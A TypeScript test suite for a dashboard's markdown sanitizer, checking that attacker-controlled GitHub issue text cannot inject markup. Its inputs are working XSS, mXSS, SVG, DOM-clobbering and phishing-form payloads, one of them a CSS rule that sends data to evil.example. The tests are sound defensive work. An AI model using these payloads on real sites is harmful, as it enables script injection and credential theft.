// Sanitizer tests for the real exported renderMarkdown.
//
// Task descriptions and comment bodies are mirrored verbatim from third-party
// sources (GitHub issue and comment bodies), so renderMarkdown is the security
// boundary between attacker-controlled markdown and the dashboard DOM. These
// tests pin that boundary: the payloads below must stay neutralised across any
// future change to the sanitizer configuration.
import { readFileSync, readdirSync, statSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import { dirname, join, relative } from 'node:path';
import { JSDOM } from 'jsdom';

// Deliberate version skew, do not "fix" blindly: package.json declares
// jsdom@^26.1.0 but @types/jsdom@^28.0.3. DefinitelyTyped publishes no types for
// jsdom 22-26 (its version list jumps 21.1.7 -> 27.0.0), and jsdom ships none of
// its own, so no matching major exists to pin to. 28.0.3 is `latest` and covers
// the two APIs used here (`new JSDOM(string)` and `.window`), both stable across
// all of these majors. jsdom is held at 26 because the component harness on the
// Phase 2 branch is built against it; renderMarkdown's output was verified
// byte-identical on 26.1.0 and 29.1.1 over a 95-payload corpus before pinning.
//
// DOMPurify binds to `globalThis.window` when its module is first evaluated, so
// a DOM has to exist before markdown.js (and its dompurify import) is loaded.
const dom = new JSDOM('');
const globals = globalThis as unknown as { window?: unknown; document?: unknown };
globals.window = dom.window;
globals.document = dom.window.document;

const { renderMarkdown } = await import('./markdown.js');

// The SHARED marked singleton, imported here on purpose. markdown.ts must not
// be using it — see the last check in taskLists(), which poisons this object
// and asserts renderMarkdown is unaffected.
const { marked } = await import('marked');

const failures: string[] = [];
let checks = 0;

// T-4. `checks += 1` happens BEFORE `fn()`, and it has to: a check whose body
// throws must still be counted, or a failure would look like a deletion. The
// consequence is that EXPECTED_CHECKS pins the DELETION of a check and not its
// EVISCERATION. Measured: reverting `slot` from FORBID_ATTR and replacing that
// check's body with an early return was green at 69 — the call site is still
// there, the count is unchanged, and the protection is gone.
//
// So the assertions are counted too. Every assert* helper below bumps this, and
// run() pins the total the same way it pins the check total.
let assertions = 0;

function check(name: string, fn: () => void): void {
  checks += 1;
  try {
    fn();
  } catch (err) {
    failures.push(`${name}: ${(err as Error).message}`);
  }
}

function parse(html: string): HTMLElement {
  const host = dom.window.document.createElement('div');
  host.innerHTML = html;
  return host as unknown as HTMLElement;
}

function assertNoElement(html: string, selector: string, message: string): void {
  assertions += 1;
  if (parse(html).querySelector(selector) !== null) {
    throw new Error(`${message}: found <${selector}> in ${JSON.stringify(html)}`);
  }
}

function assertElement(html: string, selector: string, message: string): void {
  assertions += 1;
  if (parse(html).querySelector(selector) === null) {
    throw new Error(`${message}: no <${selector}> in ${JSON.stringify(html)}`);
  }
}

function assertNotContains(html: string, needle: string, message: string): void {
  assertions += 1;
  if (html.toLowerCase().includes(needle.toLowerCase())) {
    throw new Error(`${message}: found ${JSON.stringify(needle)} in ${JSON.stringify(html)}`);
  }
}

function assertContains(html: string, needle: string, message: string): void {
  assertions += 1;
  if (!html.includes(needle)) {
    throw new Error(`${message}: missing ${JSON.stringify(needle)} in ${JSON.stringify(html)}`);
  }
}

function assertEqual(actual: string, expected: string, message: string): void {
  assertions += 1;
  if (actual !== expected) {
    throw new Error(`${message}: expected ${JSON.stringify(expected)}, got ${JSON.stringify(actual)}`);
  }
}

/** Fails if any element in the output carries an inline event handler. */
function assertNoEventHandlers(html: string, message: string): void {
  assertions += 1;
  for (const el of parse(html).querySelectorAll('*')) {
    for (const attr of el.attributes) {
      if (attr.name.toLowerCase().startsWith('on')) {
        throw new Error(`${message}: ${el.tagName} has ${attr.name} in ${JSON.stringify(html)}`);
      }
    }
  }
}

// ---------------------------------------------------------------------------
// 1. Phishing surface — issue #195. Form controls must not survive.
// ---------------------------------------------------------------------------

function formControls(): void {
  const phishing = renderMarkdown(
    '<form action="https://evil.example"><input name=token type=password>' +
      '<button>Sign in</button></form>',
  );

  check('form tag stripped', () => {
    assertNoElement(phishing, 'form', 'credential-phishing form survived');
  });
  check('form action attribute stripped', () => {
    assertNotContains(phishing, 'evil.example', 'attacker origin survived');
    assertNotContains(phishing, 'action', 'action attribute survived');
  });
  check('password input stripped', () => {
    assertNoElement(phishing, 'input', 'password field survived');
    assertNotContains(phishing, '<input', 'input tag survived');
  });
  check('submit button stripped', () => {
    assertNoElement(phishing, 'button', 'submit button survived');
  });

  check('select and option stripped', () => {
    const out = renderMarkdown('<select><option>a</option></select>');
    assertNoElement(out, 'select', 'select survived');
    assertNotContains(out, '<option', 'option survived');
  });
  check('textarea stripped', () => {
    const out = renderMarkdown('<textarea>x</textarea>');
    assertNoElement(out, 'textarea', 'textarea survived');
  });
  // Read this check's name literally: it asserts the TAG rule, not the attribute
  // rule. `formaction` is only valid on <button>/<input> and `action` only on
  // <form>, and all three tags are in FORBID_TAGS, so the host tag is stripped
  // before either attribute rule is ever consulted.
  //
  // This disclosure used to say that BOTH FORBID_ATTR entries were untestable in
  // isolation. Measured, that was half wrong, and the wrong half mattered:
  // DOMPurify applies ALLOWED_ATTR per ATTRIBUTE, not per tag-and-attribute, and
  // `action` is in its default allowlist — so `<div action="…">` survives
  // DOMPurify's defaults and is stripped only by our FORBID_ATTR. `action` is
  // therefore testable through renderMarkdown and is pinned in the next check.
  // `formaction` is NOT in the default allowlist, so it is dropped on any host
  // tag with or without our rule; that half of the disclosure was exactly right
  // and this check remains a tag-rule assertion only.
  check('formaction cannot survive because its host tag is stripped', () => {
    const out = renderMarkdown('<button formaction="https://evil.example">go</button>');
    assertNotContains(out, 'formaction', 'formaction survived');
    assertNotContains(out, 'evil.example', 'attacker origin survived');
  });

  // The attribute-side pin for FORBID_ATTR. Its stated design property — "both
  // the tag and the attribute are forbidden so that neither rule is load-bearing
  // on its own" — had no test on the attribute side at all until this check.
  // Verified against a DOMPurify-defaults control: without FORBID_ATTR the
  // attribute survives here, so this check is not a no-op.
  check('action attribute stripped from a tag that survives', () => {
    const out = renderMarkdown('<div action="https://evil.example">x</div>');
    assertNotContains(out, 'action', 'action attribute survived on a permitted tag');
    assertNotContains(out, 'evil.example', 'attacker origin survived');
    assertContains(out, 'x', 'element content should be preserved');
  });

  // slot is not exploitable through either sink today: slot assignment considers
  // only the DIRECT children of the shadow host and the markdown lands two levels
  // deeper, inside <sl-details>. That is a property of the surrounding template's
  // nesting, not of the sanitizer, and it stops holding the moment anyone
  // flattens the markup by one level. Forbidding the attribute makes the
  // invariant unconditional. Also verified against the defaults control: `slot`
  // is in DOMPurify's default allowlist and survives without our rule.
  check('slot attribute stripped (no projection into the host UI)', () => {
    const out = renderMarkdown('<div slot="footer">x</div>');
    assertNotContains(out, 'slot', 'slot attribute survived');
    assertContains(out, 'x', 'element content should be preserved');
  });
}

// ---------------------------------------------------------------------------
// 2. Spoofing surface — audit findings LOW-1 (style) and LOW-2 (download).
// ---------------------------------------------------------------------------

function spoofingAttributes(): void {
  check('style attribute stripped', () => {
    const out = renderMarkdown(
      '<div style="position:fixed;top:0;left:0;width:100vw;height:100vh">overlay</div>',
    );
    assertNotContains(out, 'style=', 'inline style survived');
    assertNotContains(out, 'position:fixed', 'overlay styling survived');
    assertContains(out, 'overlay', 'element content should be preserved');
  });

  check('download attribute stripped', () => {
    const out = renderMarkdown('<a href="https://x.example/f" download="invoice.pdf">dl</a>');
    assertNotContains(out, 'download', 'download attribute survived');
    assertContains(out, 'https://x.example/f', 'safe href should be preserved');
  });

  // A non-modal <dialog> gets `position: absolute` and an opaque
  // `background-color: Canvas` from the HTML Standard's default rendering, so it
  // is an overlay primitive that needs no style attribute to work.
  check('dialog stripped (no fake modal)', () => {
    const out = renderMarkdown('<dialog open>Enter your password</dialog>');
    assertNoElement(out, 'dialog', 'dialog survived');
    assertContains(out, 'Enter your password', 'content should be preserved');
  });

  // Both sinks inject this HTML inside a Lit shadow root that carries the
  // component's own stylesheet, so a surviving class would resolve against real
  // component CSS. This is the audit's verified forged-comment-header payload.
  check('class attribute stripped (no CSS-reuse forgery)', () => {
    const out = renderMarkdown(
      '<div class="comment"><div class="comment-header">' +
        '<span class="comment-author">farmtable-admin</span>' +
        '<span class="comment-time">2 minutes ago</span></div>' +
        '<div class="comment-body">Your session expired.</div></div>',
    );
    assertNotContains(out, 'class=', 'class attribute survived');
    assertNotContains(out, 'comment-header', 'component class name survived');
    assertContains(out, 'farmtable-admin', 'text content should be preserved');
  });

  // T-7 / audit LOW-1. The DOMPurify config is otherwise covered on every axis:
  // emptying FORBID_TAGS, emptying FORBID_ATTR, adding `onerror` to ADD_ATTR,
  // widening ALLOWED_URI_REGEXP, adding `iframe` to ADD_TAGS, dropping the
  // config object and dropping the sanitize call are all red, most of them on
  // several checks at once. `SANITIZE_DOM: false` was the single measured
  // widening with NO signal — green at 69.
  //
  // SANITIZE_DOM (on by default) drops an `id`/`name` attribute whose value
  // collides with a property of `document` or of a form, which is what DOM
  // CLOBBERING needs: `<a name="body">` makes `document.body` resolve to the
  // attacker's anchor, and any later code reading `document.body` — or
  // `document.getElementById(...)`, or a form's `.action` — gets an
  // attacker-chosen node instead of the real one.
  //
  // SCOPE OF THE CLAIM, narrowly. This is NOT a claim that clobbering is
  // exploitable here today; the classic primitives want <form>/<input> and both
  // are in FORBID_TAGS. It is a claim that a widening of the sanitizer's
  // configuration has a red-on-revert, which before this check it did not. That
  // is the property worth having: the next person to add a config key has one
  // fewer axis where the suite will stay green while the boundary moves.
  check('DOM-clobbering id/name attributes stripped', () => {
    const out = renderMarkdown(
      '<a name="body">alpha</a><a id="body">bravo</a><p id="children">charlie</p>' +
        '<a name="getElementById">delta</a>',
    );
    assertNotContains(out, 'name=', 'a clobbering name attribute survived');
    assertNotContains(out, 'id=', 'a clobbering id attribute survived');
    // The token here was `'a'` through round 7, which the surviving <a> TAG
    // satisfies on its own — the assertion could not fail while any anchor was
    // rendered, so it was not observing text preservation at all. Distinctive
    // tokens, and the FIRST and LAST elements' text, so that a sanitizer change
    // which truncates the document rather than stripping attributes is also
    // caught here rather than only by the two negatives above.
    assertContains(out, 'alpha', 'text content of the first element should be preserved');
    assertContains(out, 'delta', 'text content of the last element should be preserved');
  });
}

// ---------------------------------------------------------------------------
// 3. Script execution regressions. These already hold; pinned so that a future
//    configuration change cannot silently reopen script execution.
// ---------------------------------------------------------------------------

function scriptExecution(): void {
  check('script tag stripped', () => {
    const out = renderMarkdown('<script>alert(1)</script>');
    assertNoElement(out, 'script', 'script survived');
    assertNotContains(out, 'alert(1)', 'script body survived');
  });

  check('inline event handler stripped', () => {
    const out = renderMarkdown('<img src=x onerror=alert(1)>');
    assertNoEventHandlers(out, 'event handler survived');
    assertNotContains(out, 'onerror', 'onerror survived');
  });

  check('javascript: href stripped', () => {
    const out = renderMarkdown('[click](javascript:alert(1))');
    assertNotContains(out, 'javascript:', 'javascript: URL survived');
    assertContains(out, 'click', 'link text should be preserved');
  });

  check('data: html href stripped', () => {
    const out = renderMarkdown('[click](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)');
    assertNotContains(out, 'data:text/html', 'data: HTML URL survived');
  });

  // Pins the URI POLICY itself, not one scheme. The three checks above each name
  // a scheme DOMPurify blocks by default; none of them notices
  // `ALLOW_UNKNOWN_PROTOCOLS: true`, which leaves javascript:, vbscript: and
  // data: blocked — so every scheme-specific check stays green — while letting
  // every other scheme through. Verified: with that flag set,
  // `<a href="evilproto:payload">` survives intact. Not XSS on its own; the
  // exposure is whatever exotic scheme handlers the user's OS has registered,
  // and the point is that a one-word configuration change should not be able to
  // widen the URL allowlist silently.
  check('unknown URL schemes are dropped', () => {
    assertNotContains(
      renderMarkdown('<a href="evilproto:payload">x</a>'),
      'evilproto:',
      'unknown protocol survived — has ALLOW_UNKNOWN_PROTOCOLS been enabled?',
    );
  });

  check('iframe srcdoc stripped', () => {
    const out = renderMarkdown('<iframe srcdoc="<script>alert(1)</script>"></iframe>');
    assertNoElement(out, 'iframe', 'iframe survived');
    assertNotContains(out, 'srcdoc', 'srcdoc survived');
  });

  check('mXSS mglyph payload neutralised', () => {
    const out = renderMarkdown(
      '<math><mtext><table><mglyph><style><!--</style><img title="-->' +
        '<img src=1 onerror=alert(1)>">',
    );
    assertNoElement(out, 'img', 'mXSS img survived');
    assertNoEventHandlers(out, 'mXSS handler survived');
    assertNotContains(out, 'alert(1)', 'mXSS payload survived');
  });

  check('base tag stripped', () => {
    const out = renderMarkdown('<base href="https://evil.example/">');
    assertNoElement(out, 'base', 'base survived');
    assertNotContains(out, 'evil.example', 'base href survived');
  });

  check('meta refresh stripped', () => {
    const out = renderMarkdown('<meta http-equiv="refresh" content="0;url=https://evil.example">');
    assertNoElement(out, 'meta', 'meta survived');
    assertNotContains(out, 'evil.example', 'redirect target survived');
  });

  check('object and embed stripped', () => {
    const out = renderMarkdown(
      '<object data="https://evil.example/x"></object><embed src="https://evil.example/y">',
    );
    assertNoElement(out, 'object', 'object survived');
    assertNoElement(out, 'embed', 'embed survived');
    assertNotContains(out, 'evil.example', 'attacker origin survived');
  });

  check('style element stripped', () => {
    const out = renderMarkdown('<style>body{display:none}</style>');
    assertNoElement(out, 'style', 'style element survived');
    assertNotContains(out, 'display:none', 'style rules survived');
  });

  check('target attribute stripped (no tabnabbing)', () => {
    const out = renderMarkdown('<a href="https://x.example" target="_blank">x</a>');
    assertNotContains(out, 'target', 'target survived');
  });
}

// ---------------------------------------------------------------------------
// 3b. SVG. <svg> is in DOMPurify's default allowlist and survives, and SVG is
//     historically the richest bypass surface after MathML: foreignObject
//     re-enters the HTML namespace, the animation elements can retarget an
//     attribute at runtime, and xlink:href is a second URL channel that a naive
//     href-only check misses. All of these are neutralised today; pinned so a
//     configuration change cannot silently reopen them.
//
//     Note both assertion styles are used throughout, for the reason given at
//     the mXSS check above: a structural query alone can false-negative on
//     re-parse.
// ---------------------------------------------------------------------------

function svgSurface(): void {
  // foreignObject is an HTML integration point, so a form inside it is parsed in
  // the HTML namespace and would be a working phishing form if it survived.
  check('svg foreignObject cannot smuggle form controls', () => {
    const out = renderMarkdown(
      '<svg><foreignObject><form action="https://evil.example">' +
        '<input name=token type=password></form></foreignObject></svg>',
    );
    assertNoElement(out, 'form', 'form survived inside foreignObject');
    assertNoElement(out, 'input', 'password field survived inside foreignObject');
    assertNotContains(out, 'foreignobject', 'foreignObject survived');
    assertNotContains(out, 'evil.example', 'attacker origin survived');
  });

  check('svg script element stripped', () => {
    const out = renderMarkdown('<svg><script>alert(1)</script></svg>');
    assertNoElement(out, 'script', 'script survived inside svg');
    assertNotContains(out, 'alert(1)', 'script body survived');
  });

  check('svg event handler stripped', () => {
    const out = renderMarkdown('<svg onload=alert(1)><circle onclick=alert(2)></circle></svg>');
    assertNoEventHandlers(out, 'svg event handler survived');
    assertNotContains(out, 'onload', 'onload survived');
    assertNotContains(out, 'alert(', 'handler body survived');
  });

  // animate/set can rewrite another element's attribute after sanitization, so
  // they are a way to introduce a javascript: URL that was never in the markup.
  check('svg animation elements stripped', () => {
    const animate = renderMarkdown(
      '<svg><animate attributeName="href" values="javascript:alert(1)"></animate></svg>',
    );
    assertNoElement(animate, 'animate', 'animate survived');
    assertNotContains(animate, 'attributename', 'animate attributeName survived');
    assertNotContains(animate, 'javascript:', 'animated javascript: URL survived');

    const set = renderMarkdown(
      '<svg><set attributeName="href" to="javascript:alert(1)"></set></svg>',
    );
    assertNoElement(set, 'set', 'set survived');
    assertNotContains(set, 'javascript:', 'animated javascript: URL survived');
  });

  // xlink:href is a separate attribute from href and needs its own coverage.
  check('svg xlink:href javascript URL stripped', () => {
    const out = renderMarkdown(
      '<svg><a xlink:href="javascript:alert(1)"><text y="20">click</text></a></svg>',
    );
    assertNotContains(out, 'javascript:', 'xlink javascript: URL survived');
    assertNotContains(out, 'xlink', 'xlink attribute survived');
    assertContains(out, 'click', 'link text should be preserved');
  });

  check('svg use element stripped', () => {
    const out = renderMarkdown(
      '<svg><use href="#x"></use>' +
        '<use xlink:href="data:image/svg+xml;base64,PHN2Zz48L3N2Zz4="></use></svg>',
    );
    assertNoElement(out, 'use', 'use survived');
    assertNotContains(out, 'data:image/svg+xml', 'data: URL reference survived');
  });

  check('svg image javascript URL stripped', () => {
    const out = renderMarkdown('<svg><image href="javascript:alert(1)"></image></svg>');
    assertNotContains(out, 'javascript:', 'image javascript: URL survived');
    assertNoEventHandlers(out, 'image event handler survived');
  });

  // DOMPurify strips <style> in the HTML namespace by default but allows it in
  // the SVG one, so this is the one place a <style> element can reach the shadow
  // root. Arbitrary CSS there outranks the forbidden inline style attribute: it
  // restyles the whole component, not one element.
  check('svg style element stripped (no CSS injection into the shadow root)', () => {
    const out = renderMarkdown(
      '<svg><style>:host{position:fixed;top:0;left:0;width:100vw;height:100vh;' +
        'background:#fff;z-index:9999}</style></svg>',
    );
    assertNoElement(out, 'style', 'style element survived inside svg');
    assertNotContains(out, 'position:fixed', 'overlay rule survived');
    assertNotContains(out, 'z-index', 'stacking rule survived');
  });

  // Distinct from the visual-spoofing case above: @import and url() in a rule
  // reach an attacker origin with no user interaction, so the fix has to be
  // pinned against the remote-fetch vector specifically and not just the
  // overlay one.
  check('svg style cannot reach an attacker origin', () => {
    const imported = renderMarkdown(
      '<svg><style>@import url(https://evil.example/x.css);</style></svg>',
    );
    assertNoElement(imported, 'style', 'style element survived');
    assertNotContains(imported, '@import', '@import survived');
    assertNotContains(imported, 'evil.example', 'remote stylesheet origin survived');

    const exfil = renderMarkdown(
      '<svg><style>a[href^="https://internal"]{background:url(https://evil.example/leak)}' +
        '</style></svg>',
    );
    assertNoElement(exfil, 'style', 'style element survived');
    assertNotContains(exfil, 'evil.example', 'exfiltration origin survived');
  });

  // The sinks wrap markdown in block containers, so a payload does not need a
  // top-level raw-HTML block to reach the sanitizer. These three are the cases
  // proving the <svg><style> fix is reachable through ordinary markdown, so they
  // are the most load-bearing of the round-2 security work.
  //
  // One check() per container, deliberately. These were previously three
  // payloads looped inside a single check(), which made them invisible to the
  // EXPECTED_CHECKS pin: emptying the list left the suite green at the same
  // total. Splitting them puts each payload under the check-total pin that
  // already exists and is already proven to fire, rather than introducing a
  // second, parallel length assertion that would itself need guarding.
  const assertSvgStyleStripped = (md: string): void => {
    const out = renderMarkdown(md);
    assertNoElement(out, 'style', `style survived in ${JSON.stringify(md)}`);
    assertNotContains(out, 'display:none', `style rules survived in ${JSON.stringify(md)}`);
  };

  check('svg style stripped inside a markdown list', () => {
    assertSvgStyleStripped('- <svg><style>*{display:none}</style></svg>');
  });

  check('svg style stripped inside a blockquote', () => {
    assertSvgStyleStripped('> <svg><style>*{display:none}</style></svg>');
  });

  check('svg style stripped inside a table cell', () => {
    assertSvgStyleStripped('| a |\n| - |\n| <svg><style>*{display:none}</style></svg> |');
  });
}

// ---------------------------------------------------------------------------
// 4. Positive cases. A sanitizer that breaks ordinary rendering is its own
//    outage, so pin the shapes real task descriptions rely on.
// ---------------------------------------------------------------------------

function ordinaryMarkdown(): void {
  check('headings render', () => {
    assertEqual(renderMarkdown('# Title'), '<h1>Title</h1>\n', 'heading changed');
  });

  check('emphasis renders', () => {
    assertEqual(
      renderMarkdown('**bold** and _em_'),
      '<p><strong>bold</strong> and <em>em</em></p>\n',
      'emphasis changed',
    );
  });

  check('safe links render with href intact', () => {
    const out = renderMarkdown('[docs](https://example.com/docs)');
    assertElement(out, 'a[href="https://example.com/docs"]', 'safe link lost its href');
    assertContains(out, 'docs</a>', 'link text lost');
  });

  check('relative links render', () => {
    assertElement(renderMarkdown('[t](/tasks/1)'), 'a[href="/tasks/1"]', 'relative link lost');
  });

  // marked emits class="language-js" here; FORBID_ATTR strips it. Nothing in
  // this repo consumes that class (there is no syntax highlighter), so the loss
  // is cosmetically and functionally nil.
  check('code blocks render', () => {
    assertEqual(
      renderMarkdown('```js\nconst a = 1;\n```'),
      '<pre><code>const a = 1;\n</code></pre>\n',
      'code block changed',
    );
  });

  check('inline code escapes html', () => {
    const out = renderMarkdown('use `<form>` here');
    assertContains(out, '<code>&lt;form&gt;</code>', 'inline code lost its escaped content');
    assertNoElement(out, 'form', 'inline code produced a real form');
  });

  check('lists render', () => {
    assertEqual(
      renderMarkdown('- one\n- two\n'),
      '<ul>\n<li>one</li>\n<li>two</li>\n</ul>\n',
      'list changed',
    );
  });

  check('tables render', () => {
    const out = renderMarkdown('| a | b |\n| - | - |\n| 1 | 2 |\n');
    assertElement(out, 'table', 'table lost');
    assertContains(out, '<th>a</th>', 'table header lost');
  });

  check('images with safe src render', () => {
    assertElement(
      renderMarkdown('![alt](https://example.com/i.png)'),
      'img[src="https://example.com/i.png"]',
      'safe image lost',
    );
  });

  check('empty input renders empty', () => {
    assertEqual(renderMarkdown(''), '', 'empty markdown should render empty');
  });
}

// ---------------------------------------------------------------------------
// 4b. The INPUT CONTRACT: how many arguments renderMarkdown takes, and what it
//     does with a value that is not a string.
//
//     Both of these are cardinality questions about a collection the rest of
//     this file never varies, and that is exactly why they were missed for five
//     rounds. Every mutation vector V1-V25 changes a BINDING, a CALL-SITE
//     SPELLING or a MODULE SPECIFIER; not one changes an ARITY, and every
//     behavioural check above calls renderMarkdown with exactly one string. A
//     harness that cannot express an input cannot test it, so the useful
//     question is not "what mutation survives" but "what inputs can these tests
//     not express". For renderMarkdown the answer was the argument list at
//     cardinality two and the input domain at cardinality zero.
// ---------------------------------------------------------------------------

function inputContract(): void {
  // ARITY. `renderMarkdown(body, { inline: true })` renames nothing, introduces
  // no binding and adds no file, so R1-R7 are blind to it by construction: they
  // all match on names and call shape, and a second argument changes neither.
  // It is nonetheless a configuration channel into the sanitizer opened from a
  // sink file, which is the thing R8 exists to deny — R8 just took away the
  // MODULE SPECIFIER, and an options parameter reconfigures the sanitizer
  // through the front door with no specifier to match.
  //
  // THE DECLARATION SCAN IS THE LOAD-BEARING HALF. `renderMarkdown.length` is
  // kept, but its claim is narrower than the previous wording here asserted —
  // see the docblock above `renderMarkdownArityViolation` for what each half
  // measures and for the three spellings that defeated the round-6 version of
  // this check. The sink-side half of the same fix is in
  // `sinkArgumentIsSanitized`, which rejects a top-level comma.
  check('renderMarkdown accepts exactly one parameter', () => {
    const violation = renderMarkdownArityViolation(
      readFileSync(join(findWebRoot(), 'src', 'util', 'markdown.ts'), 'utf8'),
    );
    if (violation !== null) throw new Error(`src/util/markdown.ts: ${violation}`);

    // The sentence that stood here — "every arity spelling that survives `tsc`
    // leaves this at 1 by definition, so this assertion has no unique coverage"
    // — was measured FALSE IN BOTH DIRECTIONS. Do not restore it; it is an
    // invitation to delete the assertion below.
    //
    // `Function.length` stops counting at the first DEFAULTED-OR-REST parameter,
    // not at the first OPTIONAL one, and those move it opposite ways:
    //   (...md: string[])   -> 0  and  (md = '')       -> 0   (DOWN)
    //   (md, opts?: { … })  -> 2                              (UP: `tsc` ERASES
    //                                                          `?`, so the emitted
    //                                                          function really has
    //                                                          two parameters)
    //   (md, opts = {})     -> 1  and  (md, ...r: T[]) -> 1   (invisible here)
    // Measured over all eleven ARITY_EVASIONS compiled and read back, three
    // (C7-j, C7-k, C7-d) drive it off 1.
    //
    // That does not make this assertion the reporter for those three: the
    // declaration scan above runs first and throws. What it buys, measured by
    // ablation rather than assumed — with `renderMarkdownArityViolation` blinded
    // and both arity tables emptied, `opts?: T` is caught here and nowhere else,
    // while `opts = {}` under the same ablation stays green. So it is a backstop
    // for exactly the UP direction, plus source/artifact divergence.
    assertEqual(
      String(renderMarkdown.length),
      '1',
      'the compiled renderMarkdown does not take exactly one argument, even though the ' +
        'declaration scan above passed. Either the declaration grew an OPTIONAL parameter ' +
        '(`opts?: T` is erased by tsc and still counts, pushing .length UP to 2) or a ' +
        'DEFAULTED-OR-REST one (`md = \'\'`, `...md: string[]` push it DOWN to 0) and the scan ' +
        'above failed to see it; or the artifact this suite imported has diverged from the ' +
        'source the scan read (stale build, bundler transform, re-export from another module)',
    );
  });

  // The rule above is the only source scan in this file that used to be
  // unfixturable, because it read a fixed path and no fixture could express a
  // different declaration. Parameterising it on its input text fixes that, which
  // is what makes the three round-6 bypasses expressible here rather than only
  // in an out-of-repo mutation harness. Positives and false-positive controls
  // are asserted in the same check for the usual reason: they have to move
  // together.
  check('fixture: the arity pin catches every known widening and rejects nothing correct', () => {
    const problems: string[] = [
      fixtureTableViolation('ARITY_EVASIONS', ARITY_EVASIONS, 13),
      fixtureTableViolation('ARITY_LEGITIMATE', ARITY_LEGITIMATE, 8),
    ].filter((v): v is string => v !== null);
    for (const { label, replace } of ARITY_EVASIONS) {
      const occurrences = ARITY_SOUND_SOURCE.split(ARITY_DECL).length - 1;
      if (occurrences !== 1) {
        problems.push(`${label}: fixture anchor matched ${occurrences} times, expected 1`);
        continue;
      }
      if (renderMarkdownArityViolation(ARITY_SOUND_SOURCE.replace(ARITY_DECL, replace)) === null) {
        problems.push(`SURVIVED: ${label}`);
      }
    }
    for (const { label, replace } of ARITY_LEGITIMATE) {
      const violation = renderMarkdownArityViolation(
        ARITY_SOUND_SOURCE.replace(ARITY_DECL, replace),
      );
      if (violation !== null) {
        problems.push(`FALSE POSITIVE: ${label} — ${violation}`);
      }
    }
    if (problems.length > 0) {
      throw new Error(`the arity pin is broken: ${problems.join(' | ')}`);
    }
  });

  // INPUT DOMAIN. marked throws on undefined, null and non-strings, and both
  // sinks pass values that arrive over gRPC (`c.body`, `this.description`). A
  // throw inside a Lit `render()` takes down the whole component, not the one
  // field, so an absent description would blank the inspector. Availability
  // rather than XSS — but the suite tested `''` and never tested absent, which
  // is cardinality zero on the input domain, the same blind axis as the arity
  // above.
  check('renderMarkdown does not throw on non-string input', () => {
    for (const bad of [undefined, null, 42, {}, []]) {
      const label = bad === undefined ? 'undefined' : JSON.stringify(bad);
      let out: string;
      try {
        out = renderMarkdown(bad as unknown as string);
      } catch (err) {
        throw new Error(
          `renderMarkdown threw on ${label} input (${(err as Error).message}) — a throw inside ` +
            'render() takes down the whole Lit component, not one field',
        );
      }
      assertEqual(out, '', `non-string input ${label} should render empty`);
    }
  });
}

// ---------------------------------------------------------------------------
// 5. Task lists. FORBID_TAGS strips marked's <input type=checkbox>, so
//    renderMarkdown substitutes an inert glyph. Pin that the checked and
//    unchecked states stay distinguishable, that the state is still exposed to
//    assistive technology, and that no input comes back.
// ---------------------------------------------------------------------------

function taskLists(): void {
  check('task list state survives without an input element', () => {
    const out = renderMarkdown('- [ ] todo\n- [x] done\n');
    assertNoElement(out, 'input', 'checkbox input survived');
    assertContains(out, '☐\uFE0E', 'unchecked state lost');
    assertContains(out, '☑\uFE0E', 'checked state lost');
    assertContains(out, 'todo', 'unchecked item text lost');
    assertContains(out, 'done', 'checked item text lost');
  });

  // The real <input type=checkbox> was announced with a checked/unchecked state;
  // the glyph only keeps that for screen readers via role + aria-label, so pin
  // both labels and their pairing with the right glyph.
  check('task list state is exposed to assistive technology', () => {
    const out = renderMarkdown('- [ ] todo\n- [x] done\n');
    assertElement(out, 'span[role="img"][aria-label="Completed"]', 'checked label lost');
    assertElement(out, 'span[role="img"][aria-label="Not completed"]', 'unchecked label lost');
    assertContains(out, '<span role="img" aria-label="Completed">☑\uFE0E</span>', 'checked pairing lost');
    assertContains(
      out,
      '<span role="img" aria-label="Not completed">☐\uFE0E</span>',
      'unchecked pairing lost',
    );
  });

  check('nested task lists keep their state', () => {
    const out = renderMarkdown('- [x] outer\n  - [ ] inner\n');
    assertNoElement(out, 'input', 'checkbox input survived');
    assertContains(out, '☑\uFE0E</span> outer', 'outer state lost');
    assertContains(out, '☐\uFE0E</span> inner', 'inner state lost');
  });

}

// ---------------------------------------------------------------------------
// 5b. The shared `marked` singleton. ITS OWN SECTION, AND IT RUNS LAST.
//
//     This lived at the bottom of taskLists() through round 7, kept in place by
//     a COMMENT saying "deliberately LAST in taskLists()". That is not a
//     mechanism: appending one more check to taskLists() silently moves it, and
//     the comment would still read as though it had not. Ordering that a
//     comment enforces is ordering that a future edit breaks quietly, which is
//     the same defect this file keeps finding in its own guards.
//
//     It is now a function of its own, invoked LAST in run(). Moving it is still
//     possible, but it takes an edit to run() that says what it is doing.
// ---------------------------------------------------------------------------

function sharedMarkedSingleton(): void {
  // T-8. markdown.ts uses a PRIVATE `new Marked({…})` instance rather than
  // configuring the shared `marked` singleton, and calls that a security
  // property — correctly: the singleton is process-global, any module that
  // imports `marked` can `use()` a renderer on it, and a renderer runs BEFORE
  // DOMPurify sees the string, so it can emit markup from a code path the
  // sanitizer's own configuration never had a say in.
  //
  // It had no pin. Measured: swapping `new Marked({…})` for `marked.use({…})`
  // on the singleton was green at 69 checks — nothing in the suite ever touched
  // the singleton, and with nobody else configuring it the output is identical.
  //
  // This observes the property BY EFFECT, not by name. A by-name scan
  // ("markdown.ts must contain `new Marked`") is the shape this file has been
  // defeated on repeatedly, and it would pass on `new Marked()` followed by a
  // singleton `use()`. Here the singleton is actually poisoned and renderMarkdown
  // is asked to render a task list: on its own instance the poisoning is
  // invisible to it, on the singleton the payload comes back.
  //
  // ORDER-DEPENDENCE, stated because it is real and permanent: `marked.use` has
  // no undo. This check therefore poisons the singleton irreversibly, and it
  // re-asserts the ordinary glyph output afterwards. Any check that depends on
  // the singleton and runs after it will see the hostile renderer — a property
  // of the singleton being global, which is the thing being pinned.
  //
  // That is why it is the LAST call in run() rather than the last line of a
  // section. Through round 7 the ordering was asserted by a comment inside
  // taskLists(); one more check appended there would have moved it with nothing
  // to notice.
  check('renderMarkdown does not use the shared marked singleton', () => {
    marked.use({
      renderer: {
        checkbox: (): string => '<img src=x onerror=alert(1)>',
      },
    });

    // POSITIVE CONTROL FIRST. Without it the assertions below hold vacuously
    // whenever `use()` silently fails to take effect, and a vacuous pass is the
    // exact failure mode this file exists to avoid.
    const poisoned = marked.parse('- [x] done\n') as string;
    assertContains(
      poisoned,
      'onerror',
      'the hostile renderer never took effect on the singleton, so the rest of this check is vacuous',
    );

